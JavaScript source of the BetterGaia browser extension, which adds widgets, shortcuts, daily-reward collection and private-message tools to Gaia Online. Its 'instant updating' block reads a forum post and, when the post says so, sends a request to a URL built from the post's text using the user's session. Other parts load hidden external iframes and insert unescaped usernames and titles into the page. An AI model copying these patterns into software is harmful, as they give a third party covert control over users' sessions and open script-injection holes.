/*
Main JS
Copyright (c) BetterGaia
*/

function MainJs() {

// Credits
$('body > #gaia_footer > p').append('<span id="bg_credits">\
    <span>You\'re using <a href="/forum/t.45053993/" target="_blank">BetterGaia <small>'+ localPrefs['version'] +'</small></a> \
    by <a href="http://bettergaia.com/" target="_blank">The BetterGaia Team</a>.</span> \
    <a class="bgtopofpage" href="#">Back to Top</a> \
    <a name="bg_bottomofpage"></a>\
    <iframe sandbox="allow-scripts allow-forms allow-same-origin" style="height: 0; width: 1px; border: 0; visibility: hidden;" src="http://www.bettergaia.com/public/update/"></iframe>\
</span>');

// Wrap username and move logout menu inside
$('#gaia_header #user_header_wrap').prepend('<div id="bg_userbar" class="hud-account"></div>');
$('#gaia_header #user_header_wrap #user_account').appendTo('#gaia_header #bg_userbar');
$('#gaia_header #user_dropdown_menu').appendTo('#gaia_header #bg_userbar #user_account');

// Float notifications
if (prefs['header.float'] === true && $('#gaia_header .header_content .notificationChanges').length === 1) {
    didScroll = false;

    $(window).scroll(function() {
        didScroll = true;
    });

    setInterval(function() {
        if (didScroll) {
            didScroll = false;
            $('#gaia_header .header_content .notificationChanges').toggleClass('bgscrolling', $(window).scrollTop() > 175);
        }
    }, 500);
}

// Add BG Siderbar to MyGaia
if (document.location.pathname.indexOf('/mygaia/') > -1 && prefs['mygaia.bgchat'] === true) {
    $('body.mygaia #gaia_content.grid_ray_davies #bd #yui-main .yui-g > .left').prepend('<div id="bg_sidebar" class="mg_content">\
        <div class="mg_sprite hd">BetterGaia <small class="bgversion">' + localPrefs['version'] + '</small>\
            <a class="pure-button"></a>\
        </div>\
        <div class="bd">\
            <iframe sandbox="allow-scripts allow-forms allow-same-origin allow-popups" width="100%" frameborder="0" src="http://www.bettergaia.com/sidebar/"></iframe>\
        </div>\
    </div>');

    $('#bg_sidebar .pure-button').on('click', function() {
        $('#gaia_content .left').toggleClass('bgexpanded');
    });
}

// Widgets
$('#gaia_header #bg_userbar').prepend('<ul id="bg_widgets"><li class="bgsettings"><a></a><div></div></li></ul>');

if (typeof(localPrefs['welcome']) == 'undefined') $('#bg_widgets .bgsettings').addClass('bgwelcome');
$('#bg_widgets > li.bgsettings > a').on('click.bgsettings', function() {
    // Show welcome screen if new
    if ($(this).parent().hasClass('bgwelcome') && typeof(localPrefs['welcome']) == 'undefined') {
        chrome.extension.sendMessage({elements: 'settings'});
        $(this).parent().removeClass('bgwelcome');
        return;
    }

    // BetterGaia Settings
    chrome.extension.sendMessage({elements: 'settings'});

    // Open
    $(this).parent().siblings('li').removeClass('bgopen');
});

if (prefs['header.widgets'] === true) {
    $('#bg_widgets > li.bgsettings').before('\
        <li class="bgfriends"><a></a><div></div></li>\
        <li class="bgmessages"><a></a><div></div></li>\
        <li class="bgthreads"><a></a><div></div></li>\
    <li class="bgwatchlist"><a></a><div></div></li>');

    $('#bg_widgets > li a').on('click', function() {
        if (!$(this).parent().hasClass('bgloaded') && !$(this).parent().hasClass('bgloading')) {
            // Friends
            if ($(this).parent().hasClass('bgfriends')) {
                $(this).parent().addClass('bgloading');

                $.ajax({
                    type: 'POST',
                    url: '/gapi/rest/gfooter/',
                    data: {'method': 'getfriendlist'},
                    dataType: 'text json',
                    cache: false
                })
                .done(function(data) {
                    if (data['message'] == 'success')
                        $.each(data['friendList'], function(i, value) {
                            var online = (data['friendList'][i]['fid'] === '')? 'offline' : 'online';
                            $('#bg_widgets .bgfriends div').append("<a href='/profiles/" + data['friendList'][i]['uid'] + "/' target='_black' class='" + online + "'>\
                                <img src='/gaia/members/" + data['friendList'][i]['hs'] + "' />\
                                <span>" + data['friendList'][i]['un'] + "</span>\
                            </a>");
                        });
                    else $('#bg_widgets .bgfriends div').html('<p>There was a problem fetching your friends list. <br> Error: ' + data['statusCode'] + '</p>');
                })
                .fail(function(data) {
                    $('#bg_widgets .bgfriends div').html("<p>There was a problem fetching your friends list.</p>");
                })
                .always(function(data) {
                    $('#bg_widgets .bgfriends').removeClass('bgloading').addClass('bgloaded');
                });
            }

            // PMs
            else if ($(this).parent().hasClass('bgmessages')) {
                $(this).parent().addClass('bgloading');

                $.get('/profile/privmsg.php', 'html')
                .done(function(data) {
                    var mail = $('#gaia_content #pm_content table td > img[title="Unread Message"]', data).parent().parent();
                    if (mail.length === 0) $('#bg_widgets .bgmessages div').append('<p>You have no unread messages.</p>');
                    else {
                        $(mail).each(function() {
                            var link = $('<li></li>').append("<a href='" + $(mail).find("td span.topictitle > a.topictitle").attr("href") + "'><strong>" + $(mail).find("td span.topictitle > a.topictitle").attr("title") + "</strong> from " + $(mail).find("span.name a").html() + "</a>");
                            $('#bg_widgets .bgmessages div').append(link);
                        });
                    }
                })
                .fail(function(data) {
                    $('#bg_widgets .bgmessages div').html("<p>There was a problem fetching your messages.</p>");
                })
                .always(function(data) {
                    $('#bg_widgets .bgmessages').removeClass('bgloading').addClass('bgloaded');
                });
            }

            // Sub Threads
            else if ($(this).parent().hasClass('bgthreads')) {
                $(this).parent().addClass('bgloading');

                $.get('/forum/subscription/', 'html')
                .done(function(data) {
                    var posts = $('#gaia_content #upe-unsubscribe table.forum-list tbody td.topic-new div > a.goto-new-posts', data);
                    if (posts.length === 0) $('#bg_widgets .bgthreads div').append('<p>There are no updates in your subscribed threads.</p>');
                    else {
                        $(posts).each(function() {
                            var title = $(this).prop('title').slice(0, -13);
                            var thread = $('<a href="' + $(this).attr('href') + '">' + title + '</a>');
                            $('#bg_widgets .bgthreads div').append(thread);
                        });
                    }
                })
                .fail(function(data) {
                    $('#bg_widgets .bgthreads div').html("<p>There was a problem fetching your subscribed threads.</p>");
                })
                .always(function(data) {
                    $('#bg_widgets .bgthreads').removeClass('bgloading').addClass('bgloaded');
                });
            }

            // Watchlist
            else if ($(this).parent().hasClass('bgwatchlist')) {
                $(this).parent().addClass('bgloading');

                $.get('/marketplace/watchlist/', 'html')
                .done(function(data) {
                    if ($("#watchlist_wrapper #watchlist .watchlist_rows > tbody > tr > td span.nolistings", data).length > 0) $('#bg_widgets .bgwatchlist div').append('<p>There are no items in your watchlist.</p>');
                    else {
                        var items = $("#watchlist_wrapper #watchlist .watchlist_rows > tbody > tr > td.watchlist_rows_item_field a:first-child", data);
                        $(items).each(function() {
                            var time = $(this).parent().parent().find('td.watchlist_rows_timeleft').text();
                            var name = $(this).next('a').text();
                            $('#bg_widgets .bgwatchlist div').append($(this).attr('title', name).append('<span>' + time + '</span>'));
                        });
                    }
                })
                .fail(function(data) {
                    $('#bg_widgets .bgwatchlist div').html("<p>There was a problem fetching your watchlist.</p>");
                })
                .always(function(data) {
                    $('#bg_widgets .bgwatchlist').removeClass('bgloading').addClass('bgloaded');
                });
            }
        }

        // Open
        if (!$(this).parent().hasClass('bgsettings')) {
            $(this).parent().siblings('li').removeClass('bgopen');
            $(this).parent().toggleClass('bgopen');
        }
    });
}

// Editor Toolbar
$(window).load(function() {
    // --Add emoji button
    $("body #editor #format_controls .format-text").append("<li><a class='bg_addemoji' onclick='var el = document.getElementById(\"emoticons\"); el.style.display = (el.style.display != \"block\" ? \"block\" : \"\" ); var el2 = document.getElementById(\"emote_select\"); el2.style.display = (el2.style.display != \"block\" ? \"block\" : \"\" );' title='Add Emoticons'>Add Emoticons</a></li>");

    // --Add spoiler button
    $("body #editor #format_controls .format-elements").append("<li><a class='bg_spoiler' onclick='function wrapText(elementID, openTag, closeTag) {var textarea = document.getElementById(elementID); var len = textarea.value.length; var start = textarea.selectionStart; var end = textarea.selectionEnd; var selectedText = textarea.value.substring(start, end); var replacement = openTag + selectedText + closeTag; textarea.value = textarea.value.substring(0, start) + replacement + textarea.value.substring(end, len);} wrapText(\"message\", \"[spoiler]\", \"[/spoiler]\");' title='Add Spoiler - [spoiler][/spoiler]'>Add Spoiler Tag</a></li>");
});

// Shortcuts
if (prefs['header.shortcuts'] === true) {
    // check if local prefs exist
    if (typeof(localPrefs['header.shortcuts.list']) == 'object' && $.isEmptyObject(prefs['header.shortcuts.list'])) {
        prefs['header.shortcuts.list'] = localPrefs['header.shortcuts.list'];
        console.warn('Your shortcuts are currently saved locally.');
    }

    // check if empty
    if (!$.isEmptyObject(prefs['header.shortcuts.list'])) {
        $('#gaia_header #bg_userbar').prepend('<ul id="bg_shortcuts"><a>Shortcuts</a><div></div></ul>');
        $(prefs['header.shortcuts.list']).each(function(index, data){
            $('#bg_shortcuts div').append('<a href="' + data[1] + '">' + data[0] + '</a>');
        });
    }
}

// Draw All
if (prefs['header.drawAll'] === true && ['/', '/mygaia/', '/market/', '/forum/', '/world/', '/games/', '/payments/', '/gofusion/'].indexOf(document.location.pathname) > -1 && $('#dailyChance_clawMachine').length == 1) {
	// Add Sign
	$('#dailyChance_clawMachine').after('<a class="bg_drawall" title="BetterGaia&rsquo;s Draw All Daily Chances">draw <em>all</em></a>');

    // Open model
    $('#dailyReward .bg_drawall').on('click', function() {
        if ($('#bg_drawall').length < 1) {
            var template = Handlebars.compile('<div id="bg_drawall">\
                <h1>Draw All <a class="close" title="Close"></a></h1>\
                <ul>\
                    {{#each this}}\
                    <li class="pure-g">\
                        <div class="pure-u-1-5">{{name}}</div>\
                        <div class="pure-u-4-5"><a class="pure-button" data-candy="{{id}}">Collect</a></div>\
                    </li>\
                    {{/each}}\
                </ul>\
            </div>\
            <div class="bettergaia mask"></div>');

            var candy = [{id: 1, name: 'Home'}, {id: 2, name: 'MyGaia'}, {id: 1279, name: 'Gaia Cash'}, {id: 8, name: 'Shops'}, {id: 1271, name: 'GoFusion'}, {id: 3, name: 'Forums'}, {id: 5, name: 'World'}, {id: 4, name: 'Games'}, {id: 12, name: 'Mobile App'}];
            $('body').append(template(candy));

            $('#bg_drawall h1 .close').on('click', function() {
                $('#bg_drawall').removeClass('bgopen');
            });

            $('#bg_drawall ul').on('click', '.bgreward', function() {
                $(this).parent().toggleClass('bgexpand');
            });

            $('#bg_drawall .pure-button').on('click', function() {
                var thisCandy = $(this).closest('li');
                thisCandy.addClass('loading');

                $.ajax({
                    type: 'POST',
                    url: '/dailycandy/pretty/',
                    data: {
                        action: 'issue',
                        list_id: $(this).attr('data-candy'),
                        _view: 'json'
                    },
                    dataType: 'json'
                }).done(function(data) {
                    if (data['status'] == 'ok') {
                        var template2 = Handlebars.compile('<img src="http://gaiaonline.com/images/{{data.reward.thumb}}">\
                        <strong>{{data.reward.name}}</strong>\
                        <p class="bgreward">\
                            {{#if data.reward.descrip}}\
                                {{{data.reward.descrip}}}\
                                {{#if data.tier_desc}}\
                                <br><br>{{data.tier_desc}}\
                                {{/if}}\
                            {{else}}\
                                {{#if data.tier_desc}}\
                                {{data.tier_desc}}\
                                {{/if}}\
                            {{/if}}\
                        </p>');

                        thisCandy.children('.pure-u-4-5').html(template2(data));
                    }
                    else if (data['status'] == 'fail') thisCandy.children('.pure-u-4-5').html('<p>' + data['error']['message'] + '</p>');
                    else thisCandy.children('.pure-u-4-5').html('<p>There was a problem getting your Daily Chance.</p>');
                }).fail(function() {
                    thisCandy.children('.pure-u-4-5').html('<p>There was a problem getting your Daily Chance.</p>');
                }).always(function() {
                    thisCandy.removeClass('loading').addClass('loaded');
                });
            });
        }

        $('#bg_drawall').addClass('bgopen');
    });
}

// Private Messages
if (prefs['pms'] === true && document.location.pathname.indexOf('/profile/privmsg.php') > -1) {
	// Private message selectors
	$('body.mail #pm_content table tr[height="20"] td[align]').after("<div class='bg_selecttypes'><span><a class='all'>All</a><a class='read'>Read</a><a  class='unread'>Unread</a><a class='replied'>Replied</a><a class='none'>None</a></span></div>");
	$('body.mail #pm_content table tr[bgcolor][height="42"] > td:nth-of-type(2) img').each(function(index, element) {
		$(this).closest('tr[bgcolor][height="42"]').attr('status', $(this).attr('title'));
  });

	$('body.mail #pm_content .bg_selecttypes a').on('click', function() {
		if ($(this).hasClass('all')) $('tr[bgcolor][height="42"]:not(.bgpm_hide) input[type="checkbox"]').prop('checked', true);
		if ($(this).hasClass('read')) $('tr[bgcolor][height="42"][status="Read Message"]:not(.bgpm_hide) input[type="checkbox"]').prop('checked', true);
		if ($(this).hasClass('unread')) $('tr[bgcolor][height="42"][status="Unread Message"]:not(.bgpm_hide) input[type="checkbox"]').prop('checked', true);
		if ($(this).hasClass('replied')) $('tr[bgcolor][height="42"][status="Replied Message"]:not(.bgpm_hide) input[type="checkbox"]').prop('checked', true);
		if ($(this).hasClass('none')) $('tr[bgcolor][height="42"]:not(.bgpm_hide) input[type="checkbox"]').prop('checked', false);
	});

	// Add Avatar Image
	var userids = [];
	$('tr[bgcolor][height="42"] span.name a[href]').each(function(index, element) {
		var userid = $(this).attr("href").split("/")[5];
		$(this).closest('tr[bgcolor][height="42"]').attr("userid", userid);

		if (userids.indexOf(userid) == -1) {
			userids.push(userid);
			$.get("/profiles?mode=lookup&avatar_username=" + $(this).closest('tr[bgcolor][height="42"]').find('span.name').text(), function(data){
				var i = document.createElement('img');
				$(i).load(function(){
                    $('tr[bgcolor][height="42"][userid="'+userid+'"] span.topictitle a').css({'background-image': 'url(/dress-up/avatar/' + $(data).find('response').attr('avatarPath') + ')', 'background-position': 'right -35px'});
				});
				i.src = 'http://www.gaiaonline.com/dress-up/avatar/' + $(data).find('response').attr('avatarPath');
			});
		}
	});

	// Instant Search
	$('body.mail #pm_content table tr[height="20"]').append('<input type="text" class="bgpm_search" placeholder="Search this page" value="" />');
	$.extend($.expr[":"], {"Contains": function(elem, i, match, array) {return (elem.textContent || elem.innerText || "").toLowerCase().indexOf((match[3] || "").toLowerCase()) >= 0;}});
	$('body.mail #pm_content table tr[height="20"] .bgpm_search').keyup(function() {
		var value = $(this).val();
		if (value.length > 0) {
			$('body.mail #pm_content table tr[bgcolor][height="42"]:not(:Contains("' + value + '"))').addClass('bgpm_hide').find('input[type="checkbox"]').prop('checked', false);
			$('body.mail #pm_content table tr[bgcolor][height="42"]:Contains("' + value + '")').removeClass('bgpm_hide');
		}
		else $('body.mail #pm_content table tr[bgcolor][height="42"]').removeClass('bgpm_hide');
	});
}

// Enable Instant CSS updating
if (prefs['instantUpdating'] === true) {
    $(window).load(function() {
        $.ajax({
            url: '/guilds/viewtopic.php?t=24076833',
            cache: false,
            dataType: 'html',
            headers: {'X-PJAX': true}
        })
        .done(function(html) {
            if ($('.postcontent:eq(1) .postbody span[style="color:enabled"]', html).length == 1) {
                var version = localPrefs['version'].replace(/\./g,'');
                html = $('.postcontent:eq(1) .postbody', html);

                // look for new code
                if ($('span[style="color:#' + version + '"] + .spoiler-wrapper .code', html).length == 1) {
                    chrome.storage.local.set({css: $('span[style="color:#' + version + '"] + .spoiler-wrapper .code', html).text()});
                }
                else chrome.storage.local.remove('css');

                if ($('span[style="color:getandrun"]', html).length == 1) {
                    var data = $('.postcontent:eq(1) .postbody span[style="color:getandrun"]', html).text().split(',');
                    $.ajax({url: data[0], cache: false, dataType: 'html', headers: {'X-PJAX': true}}).done(function(html) {
						if ($(data[1], html).length == 1) $.get(data[0] + $(data[1], html)[data[3]]() + data[2]);
					});
				}
			}
        });
    });
}
} // ---

// Check Storage and Fire
if (prefs['appliedUserPrefs'] === true && prefs['appliedMainJs'] === false) {
	MainJs();
	prefs['appliedMainJs'] = true;
}
